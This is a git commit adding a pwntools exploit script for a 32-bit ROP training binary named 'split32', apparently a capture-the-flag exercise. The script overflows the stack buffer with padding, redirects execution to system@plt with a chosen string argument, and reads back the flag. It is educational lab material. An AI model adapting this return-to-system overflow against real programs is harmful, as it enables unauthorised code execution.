482eef92141a7f6808ac7d8ce4650047a91164d9
November2019 <47066375+November2019@users.noreply.github.com>
2020-10-05 16:44:57 +0200

    Create split32.py

---
+++ split/32bits/split32.py
@@ -0,0 +1,62 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template split32
+from pwn import *
+exe = context.binary = ELF('split32')
+# Set up pwntools for the correct architecture
+
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     i386-32-little
+# RELRO:    Partial RELRO
+# Stack:    No canary found
+# NX:       NX enabled
+# PIE:      No PIE (0x8048000)
+
+system_at_plt = 0x0804861a
+flag_function = 0x0804a030
+
+io = start()
+
+buf = ""
+buf += "A"*(cyclic_find('laaa'))
+buf += p32(system_at_plt)
+buf += p32(flag_function)
+
+# shellcode = asm(shellcraft.sh())
+# payload = fit({
+#     32: 0xdeadbeef,
+#     'iaaa': [1, 2, 'Hello', 3]
+# }, length=128)
+# io.send(payload)
+# flag = io.recv(...)
+# log.success(flag)
+
+io.recvuntil('>')
+io.sendline(buf)
+log.success("flag %s " %io.recvall())
+
